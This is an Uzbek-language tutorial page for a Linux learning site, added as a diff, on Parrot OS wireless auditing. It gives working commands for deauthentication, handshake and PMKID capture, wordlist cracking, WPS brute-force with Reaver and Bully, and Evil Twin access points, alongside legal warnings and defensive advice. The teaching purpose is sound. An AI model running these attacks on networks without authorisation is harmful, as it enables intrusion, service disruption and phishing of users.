@@ -1,0 +1,340 @@
+---
+title: "Parrot Wireless tools"
+description: "Wi-Fi audit vositalari Parrot OS'da."
+order: 5
+level: "advanced"
+estimated_minutes: 8
+prerequisites:
+  - "/parrot/what-is-parrot"
+  - "/kali/tools/aircrack-ng"
+learning_objectives:
+  - "Wi-Fi adapter Monitor mode"
+  - "Aircrack-ng, Reaver, Wifite"
+  - "WPS attack"
+  - "Faqat o'z tarmoq'ingiz"
+tags: ["parrot", "wireless", "wifi", "audit"]
+lastUpdated: "2026-05-26"
+author: "LinuxHubuz jamoasi"
+references:
+  - title: "Parrot Wireless"
+    url: "https://parrotsec.org/docs/category/tools/"
+  - title: "Aircrack-ng"
+    url: "https://www.aircrack-ng.org/"
+---
+
+**Parrot OS** Wireless category — Wi-Fi audit vositalari. Aircrack-ng suite, Reaver (WPS), Wifite (avtomatik) — Parrot'da default.[¹](https://parrotsec.org/docs/category/tools/)
+
+<Callout type="warning" title="QONUNIY OGOHLANTIRISH">
+Wi-Fi audit faqat **o'zingiz egasi bo'lgan** tarmoqlarga. Boshqa tarmoq — jinoyat (O'zbekiston JK 278).
+</Callout>
+
+<Callout type="info" title="Bu darsda nimani o'rganasiz">
+- Wi-Fi adapter va Monitor mode.
+- Aircrack-ng suite ko'rib chiqish.
+- Wifite — avtomatik audit.
+- Reaver — WPS attack.
+- Defensive — Wi-Fi himoyasi.
+</Callout>
+
+## 1. Wi-Fi adapter
+
+Monitor mode va packet injection qo'llab-quvvatlash kerak:
+
+```bash
+# USB Wi-Fi
+lsusb | grep -i wireless
+
+# Tavsiya etiladigan chipset:
+# - Atheros AR9271
+# - Realtek RTL8812AU
+# - Ralink RT3070
+```
+
+Tekshirish:
+
+```bash
+ip link show
+sudo iw list | grep -A 5 "Supported interface modes"
+# * monitor
+```
+
+## 2. Monitor mode
+
+```bash
+# Services o'chirish
+sudo airmon-ng check kill
+
+# Monitor mode
+sudo airmon-ng start wlan0
+# wlan0 → wlan0mon
+
+# Tekshirish
+iw dev wlan0mon info
+# type monitor
+```
+
+## 3. Aircrack-ng suite
+
+Avval [Kali — Aircrack-ng](/kali/tools/aircrack-ng) darsida batafsil. Qisqacha:
+
+```bash
+# Tarmoq'larni topish
+sudo airodump-ng wlan0mon
+
+# Aniq tarmoq kuzatish
+sudo airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w capture wlan0mon
+
+# Deauth (faqat o'z tarmog'ingizda!)
+sudo aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 wlan0mon
+
+# Crack
+aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+```
+
+## 4. Wifite — avtomatik
+
+```bash
+sudo wifite
+
+# Interactive:
+# Skanlash boshlanadi
+# Tarmoq'lar ro'yxati
+# # tanlang
+# Wifite avtomatik:
+#   - Deauth
+#   - Handshake capture
+#   - PMKID attack
+#   - WPS PIN
+#   - Crack
+```
+
+Wifite — har himoya turini sinab ko'radi.
+
+## 5. Reaver — WPS attack
+
+WPS (Wi-Fi Protected Setup) — 8 raqamli PIN, brute-force mumkin:
+
+```bash
+sudo apt install -y reaver
+
+# WPS yoqilgan AP'larni topish
+sudo wash -i wlan0mon
+
+# Attack
+sudo reaver -i wlan0mon -b AA:BB:CC:11:22:33 -vv
+
+# Pixie-dust attack (tez)
+sudo reaver -i wlan0mon -b AA:BB:CC:11:22:33 -K 1
+```
+
+Pixie-dust — ba'zi router'lardagi RNG zaifligi. Daqiqalarda PIN.
+
+## 6. Bully — Reaver alternative
+
+```bash
+sudo bully wlan0mon -b AA:BB:CC:11:22:33 -c 6
+```
+
+## 7. PMKID attack (zamonaviy)
+
+WPA2'da handshake kerak emas. AP'dan PMKID olib offline crack:
+
+```bash
+# Hcxdumptool — PMKID capture
+sudo hcxdumptool -i wlan0mon --enable_status=15 -o capture.pcapng
+
+# Convert
+hcxpcapngtool -o hash.hc22000 capture.pcapng
+
+# Hashcat
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+```
+
+Klient yo'q bo'lsa ham ishlaydi (handshake'siz).
+
+## 8. Evil Twin (Rogue AP)
+
+Sun'iy "tarmoq" yaratib, foydalanuvchilarni aldash:
+
+```bash
+# Airbase-ng
+sudo airbase-ng -e "MyFakeWiFi" -c 6 wlan0mon
+
+# Yoki Fluxion (advanced)
+git clone https://github.com/FluxionNetwork/fluxion
+cd fluxion
+sudo ./fluxion.sh
+```
+
+<Callout type="warning" title="Evil Twin — yuqori risk">
+Boshqa odamlarni aldash — phishing — har qanday jurisdiction'da jinoyat.
+</Callout>
+
+## 9. Defensive — Wi-Fi himoya
+
+### 1. WPA3
+
+Yangi router — WPA3 yoqilgan. SAE algoritmi offline crack qiyinroq.
+
+### 2. WPS o'chirish
+
+Router admin panel'da WPS — **OFF**. WPS — zaiflikning asosiy manbai.
+
+### 3. Kuchli parol
+
+```bash
+# 24 belgi random
+openssl rand -base64 24
+# Yoki
+pwgen -s 24 1
+```
+
+### 4. SSID hidden — eyforiya
+
+SSID yashirgan tarmoq'lar — qisqartirilgan himoya. Aircrack-ng baribir topadi.
+
+### 5. MAC filter — qisqartirilgan
+
+MAC filter — qisqartirilgan, MAC spoofing oson:
+
+```bash
+sudo ip link set wlan0 down
+sudo macchanger -r wlan0     # random MAC
+sudo ip link set wlan0 up
+```
+
+### 6. Guest network
+
+Mehmonlar uchun — alohida tarmoq, asosiy tarmoq'ga kira olmasligi.
+
+### 7. Router firmware
+
+Yangilangan firmware — bug fix.
+
+## 10. Misol — o'z tarmog'ingiz audit
+
+```bash
+# 1. Monitor
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+
+# 2. O'z tarmoq topish
+sudo airodump-ng wlan0mon
+# Ctrl+C — BSSID va kanal yozib oling
+
+# 3. Handshake
+sudo airodump-ng -c 6 --bssid YOUR_BSSID -w mywifi wlan0mon
+
+# 4. Boshqa terminal — deauth
+sudo aireplay-ng --deauth 3 -a YOUR_BSSID wlan0mon
+
+# 5. Crack
+aircrack-ng -w /usr/share/wordlists/rockyou.txt mywifi-01.cap
+
+# 6. WPS check
+sudo wash -i wlan0mon
+# Agar yoqilgan bo'lsa — o'chiring router'da!
+
+# 7. Cleanup
+sudo airmon-ng stop wlan0mon
+sudo systemctl start NetworkManager
+```
+
+## 11. Parol kuchli ekanini tekshirish
+
+Sizning paroliningiz `rockyou.txt`'da bormi?
+
+```bash
+grep -F "YourPassword" /usr/share/wordlists/rockyou.txt
+# Agar topilsa — DARHOL o'zgartiring!
+```
+
+## 12. Eng tez-tez uchraydigan xatolar
+
+- **Internal Wi-Fi monitor mode'siz** — USB adapter zarur.
+- **`airmon-ng check kill` qilmaslik** — interface egallashgan.
+- **WPS attack lekin AP'da WPS yo'q** — Reaver ishlamaydi.
+- **Random parol crack qilib bo'lmaydi** — wordlist'da bo'lishi shart.
+- **Boshqa tarmoq audit** — jinoyat.
+
+## 13. Eng yaxshi amaliyot
+
+- **Faqat o'z tarmog'ingiz** — yozma ruxsatsiz hech qachon.
+- **WPS o'chirilgan** — birinchi qadam himoya.
+- **Random uzun parol** — 20+ belgi, `rockyou` da bo'lmaydi.
+- **WPA3** — yangi router.
+- **Guest network** — asosiy resurs'lardan ajratish.
+
+## 14. Mashqlar
+
+1. **Adapter:** Monitor mode test.
+2. **Wifite:** O'z tarmog'ingiz uchun avtomatik audit.
+3. **Reaver:** WPS yoqilgan bo'lsa, sinab ko'ring.
+4. **PMKID:** Hcxdumptool bilan.
+5. **Defensive:** O'z router — WPS o'chirilgan, parol mustahkam?
+
+## 15. Bilim sinovi
+
+**Savol 1.** WPS xavfli sababli:
+
+- a) 8 raqamli PIN, brute-force mumkin
+- b) Yo'q sabab
+- c) Faqat eski router
+- d) Hech qaysi
+
+<Callout type="success" title="Javob">
+**(a)** 8 raqam — 100M kombinatsiya, lekin amalda 11K (PIN tuzilishi sababli).
+</Callout>
+
+**Savol 2.** PMKID attack:
+
+- a) Klient kerak
+- b) Handshake'siz mumkin — faqat AP'dan
+- c) Hech narsa
+- d) WEP uchun
+
+<Callout type="success" title="Javob">
+**(b)** Klient ulanmagan bo'lsa ham ishlaydi.
+</Callout>
+
+**Savol 3.** Evil Twin:
+
+- a) Yaxshi himoya
+- b) Sun'iy AP yaratib aldash — jinoyat (phishing)
+- c) Bepul Wi-Fi
+- d) Hech narsa
+
+<Callout type="success" title="Javob">
+**(b)** Foydalanuvchilarni aldashning bir turi.
+</Callout>
+
+**Savol 4.** Wifite nima qiladi?
+
+- a) Antivirus
+- b) Avtomatik Wi-Fi audit — barcha attack'larni sinab ko'radi
+- c) Faqat WEP
+- d) Hech narsa
+
+<Callout type="success" title="Javob">
+**(b)** Bir buyruq bilan — deauth, handshake, PMKID, WPS.
+</Callout>
+
+**Savol 5.** Eng yaxshi himoya:
+
+- a) MAC filter
+- b) WPA3 + WPS off + random uzun parol
+- c) SSID hide
+- d) WEP
+
+<Callout type="success" title="Javob">
+**(b)** Layered defense.
+</Callout>
+
+## Manbalar
+
+1. Parrot Wireless. [https://parrotsec.org/docs/category/tools/](https://parrotsec.org/docs/category/tools/)
+2. Aircrack-ng. [https://www.aircrack-ng.org/](https://www.aircrack-ng.org/)
+
+## Keyingi qadam
+
+👉 [Parrot Exploitation tools](/parrot/tools/exploitation)
